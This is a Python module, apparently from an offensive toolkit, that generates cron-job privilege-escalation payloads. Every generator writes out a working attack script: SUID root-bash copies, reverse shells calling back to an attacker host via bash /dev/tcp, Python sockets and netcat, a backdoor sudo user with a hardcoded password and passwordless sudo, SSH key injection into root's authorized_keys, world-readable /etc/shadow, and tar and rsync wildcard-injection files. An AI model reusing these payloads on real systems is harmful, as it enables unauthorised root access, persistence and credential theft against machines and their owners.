"""
Payload Generator
=================

Generates various payloads for cron job exploitation.
"""

from enum import Enum
from typing import Optional
from dataclasses import dataclass


class PayloadType(Enum):
    """Types of payloads"""
    SUID_BASH = "suid_bash"  # Create SUID bash copy
    REVERSE_SHELL = "reverse_shell"  # Bash reverse shell
    ADD_USER = "add_user"  # Add sudo user
    SSH_KEY = "ssh_key"  # Add SSH key to root
    CHMOD_SHADOW = "chmod_shadow"  # Make /etc/shadow readable
    CUSTOM = "custom"  # Custom payload


@dataclass
class Payload:
    """
    Represents a generated payload.

    Attributes:
        payload_type: Type of payload
        content: The actual payload script
        description: What the payload does
        post_exploitation: What to do after execution
        cleanup: How to clean up
    """
    payload_type: PayloadType
    content: str
    description: str
    post_exploitation: str
    cleanup: Optional[str] = None


class PayloadGenerator:
    """
    Generates exploitation payloads for cron jobs.
    """

    def __init__(self):
        pass

    def generate(
            self,
            payload_type: PayloadType,
            lhost: Optional[str] = None,
            lport: Optional[int] = None,
            ssh_key: Optional[str] = None,
            custom_command: Optional[str] = None
    ) -> Payload:
        """
        Generate a payload.

        Args:
            payload_type: Type of payload to generate
            lhost: Attacker IP for reverse shell
            lport: Attacker port for reverse shell
            ssh_key: SSH public key to inject
            custom_command: Custom command for CUSTOM type

        Returns:
            Payload object
        """
        if payload_type == PayloadType.SUID_BASH:
            return self._generate_suid_bash()

        elif payload_type == PayloadType.REVERSE_SHELL:
            if not lhost or not lport:
                raise ValueError("LHOST and LPORT required for reverse shell")
            return self._generate_reverse_shell(lhost, lport)

        elif payload_type == PayloadType.ADD_USER:
            return self._generate_add_user()

        elif payload_type == PayloadType.SSH_KEY:
            if not ssh_key:
                raise ValueError("SSH public key required")
            return self._generate_ssh_key(ssh_key)

        elif payload_type == PayloadType.CHMOD_SHADOW:
            return self._generate_chmod_shadow()

        elif payload_type == PayloadType.CUSTOM:
            if not custom_command:
                raise ValueError("Custom command required")
            return self._generate_custom(custom_command)

        else:
            raise ValueError(f"Unknown payload type: {payload_type}")

    def _generate_suid_bash(self) -> Payload:
        """Generate SUID bash payload"""
        content = '''#!/bin/bash
# SUID Bash Payload
# Creates a SUID copy of bash for privilege escalation

# Copy bash with SUID bit
cp /bin/bash /tmp/rootbash 2>/dev/null
chmod +s /tmp/rootbash 2>/dev/null

# Alternative locations if /tmp fails
if [ ! -f /tmp/rootbash ]; then
    cp /bin/bash /var/tmp/rootbash 2>/dev/null
    chmod +s /var/tmp/rootbash 2>/dev/null
fi

# Create marker file
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.SUID_BASH,
            content=content,
            description="Creates a SUID copy of bash at /tmp/rootbash",
            post_exploitation="/tmp/rootbash -p   # Spawns root shell",
            cleanup="rm /tmp/rootbash /tmp/.cron_pwned"
        )

    def _generate_reverse_shell(self, lhost: str, lport: int) -> Payload:
        """Generate reverse shell payload"""
        content = f'''#!/bin/bash
# Reverse Shell Payload
# Connects back to {lhost}:{lport}

# Method 1: Bash TCP
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &

# Method 2: Python (fallback)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' 2>/dev/null &

# Method 3: Netcat (fallback)
nc -e /bin/sh {lhost} {lport} 2>/dev/null &
nc {lhost} {lport} -e /bin/sh 2>/dev/null &

# Create marker
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.REVERSE_SHELL,
            content=content,
            description=f"Reverse shell to {lhost}:{lport}",
            post_exploitation=f"nc -lvnp {lport}   # Listen on attacker machine",
            cleanup="rm /tmp/.cron_pwned"
        )

    def _generate_add_user(self) -> Payload:
        """Generate add user payload"""
        content = '''#!/bin/bash
# Add User Payload
# Creates a new sudo user: hacker / hacker123

# Create user
useradd -m -s /bin/bash hacker 2>/dev/null

# Set password (multiple methods for compatibility)
echo 'hacker:hacker123' | chpasswd 2>/dev/null
echo 'hacker123' | passwd --stdin hacker 2>/dev/null

# Add to sudo group (different distros)
usermod -aG sudo hacker 2>/dev/null
usermod -aG wheel hacker 2>/dev/null

# Allow passwordless sudo
echo 'hacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers 2>/dev/null

# Create marker
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.ADD_USER,
            content=content,
            description="Creates sudo user hacker:hacker123",
            post_exploitation="su - hacker   # Then: sudo su -",
            cleanup="userdel -r hacker; sed -i '/hacker/d' /etc/sudoers"
        )

    def _generate_ssh_key(self, ssh_key: str) -> Payload:
        """Generate SSH key injection payload"""
        content = f'''#!/bin/bash
# SSH Key Injection Payload
# Adds attacker's SSH key to root's authorized_keys

# Ensure .ssh directory exists
mkdir -p /root/.ssh 2>/dev/null
chmod 700 /root/.ssh 2>/dev/null

# Add SSH key
echo '{ssh_key}' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys 2>/dev/null

# Create marker
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.SSH_KEY,
            content=content,
            description="Injects SSH public key into root's authorized_keys",
            post_exploitation="ssh root@target   # Connect with your private key",
            cleanup="Remove your key from /root/.ssh/authorized_keys"
        )

    def _generate_chmod_shadow(self) -> Payload:
        """Generate chmod shadow payload"""
        content = '''#!/bin/bash
# Shadow File Payload
# Makes /etc/shadow world-readable for hash extraction

# Make shadow readable
chmod 644 /etc/shadow 2>/dev/null

# Copy shadow for backup
cp /etc/shadow /tmp/.shadow_copy 2>/dev/null
chmod 644 /tmp/.shadow_copy 2>/dev/null

# Create marker
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.CHMOD_SHADOW,
            content=content,
            description="Makes /etc/shadow world-readable",
            post_exploitation="cat /etc/shadow   # Extract hashes for cracking",
            cleanup="chmod 640 /etc/shadow; rm /tmp/.shadow_copy"
        )

    def _generate_custom(self, command: str) -> Payload:
        """Generate custom command payload"""
        content = f'''#!/bin/bash
# Custom Payload

{command}

# Create marker
touch /tmp/.cron_pwned 2>/dev/null
'''

        return Payload(
            payload_type=PayloadType.CUSTOM,
            content=content,
            description=f"Custom command: {command[:50]}...",
            post_exploitation="Check output of your command",
            cleanup="Depends on your command"
        )

    def generate_wildcard_injection(
            self,
            binary: str,
            target_dir: str,
            lhost: Optional[str] = None,
            lport: Optional[int] = None
    ) -> str:
        """
        Generate wildcard injection files.

        Args:
            binary: The vulnerable binary (tar, rsync, etc.)
            target_dir: Directory where wildcard expansion happens
            lhost: Attacker IP (for reverse shell)
            lport: Attacker port (for reverse shell)

        Returns:
            Shell commands to create injection files
        """
        if binary == 'tar':
            # Tar checkpoint injection
            if lhost and lport:
                shell_script = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            else:
                shell_script = "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"

            return f'''# Tar wildcard injection
cd {target_dir}
echo '{shell_script}' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
'''

        elif binary == 'rsync':
            if lhost and lport:
                shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            else:
                shell_cmd = "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"

            return f'''# Rsync wildcard injection
cd {target_dir}
echo '{shell_cmd}' > shell.sh
chmod +x shell.sh
echo "" > "-e sh shell.sh"
'''

        elif binary in ('chown', 'chmod'):
            return f'''# {binary} wildcard injection
cd {target_dir}
echo "" > "--reference=/tmp/reference_file"
# First create /tmp/reference_file with desired owner/permissions
'''

        else:
            return f"# No known wildcard injection for {binary}"

    def list_payloads(self) -> None:
        """List all available payload types"""
        print("\nAvailable Payload Types:")
        print("-" * 60)

        payloads = [
            (PayloadType.SUID_BASH, "Create SUID bash at /tmp/rootbash"),
            (PayloadType.REVERSE_SHELL, "Connect back to attacker (requires LHOST/LPORT)"),
            (PayloadType.ADD_USER, "Create sudo user hacker:hacker123"),
            (PayloadType.SSH_KEY, "Inject SSH key into root's authorized_keys"),
            (PayloadType.CHMOD_SHADOW, "Make /etc/shadow readable"),
            (PayloadType.CUSTOM, "Run custom command")
        ]

        for ptype, desc in payloads:
            print(f"  {ptype.value:<20} {desc}")